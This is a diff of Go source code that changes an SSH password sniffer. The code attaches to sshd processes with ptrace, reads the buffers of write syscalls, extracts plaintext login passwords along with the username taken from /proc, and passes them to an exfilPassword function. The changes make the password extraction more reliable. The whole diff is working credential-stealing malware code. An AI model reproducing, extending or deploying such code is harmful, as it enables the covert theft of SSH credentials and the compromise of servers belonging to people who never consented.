@@ -5,7 +5,6 @@ import (
 	"io/ioutil"
 	"regexp"
 	"runtime"
-	"strings"
 	"syscall"
 )
 
@@ -39,26 +38,45 @@ func traceSSHDProcess(pid int) {
 				return
 			}
 
-			if regs.Rdi == 5 && regs.Orig_rax == 1 {
-				buffer := make([]byte, regs.Rdx)
-				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
-				if err != nil {
-					return
-				}
+			if regs.Orig_rax == 1 {
+				fd := int(regs.Rdi)
+				if fd >= 0 && fd <= 10 {
+					bufferSize := int(regs.Rdx)
+					if bufferSize > 4 && bufferSize < 250 {
+						buffer := make([]byte, bufferSize)
+						_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
+						if err != nil {
+							syscall.PtraceSyscall(pid, 0)
+							continue
+						}
 
-				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
-					username := "root"
-					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-					matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
-					if len(matches) == 2 {
-						username = string(matches[1])
-					}
+						var password string
+						if len(buffer) >= 4 && buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0 {
+							length := int(buffer[3])
+							if length > 0 && length+4 <= len(buffer) {
+								password = string(buffer[4 : 4+length])
+							} else if length == 0 && len(buffer) > 4 {
+								password = string(buffer)
+							}
+						} else {
+							password = string(buffer)
+						}
 
-					var password = removeNonPrintableAscii(string(buffer))
-					if len(password) > 2 && len(password) < 100 && exfiled && !strings.HasPrefix(password, "fSHA256") {
-						go exfilPassword(username, removeNonPrintableAscii(password))
+						password = removeNonPrintableAscii(password)
+						if isValidPassword(password) {
+							username := "root"
+							cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+							matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
+							if len(matches) == 2 {
+								username = string(matches[1])
+							}
+
+							if exfiled {
+								go exfilPassword(username, password)
+							}
+							exfiled = !exfiled
+						}
 					}
-					exfiled = !exfiled
 				}
 			}
 		}
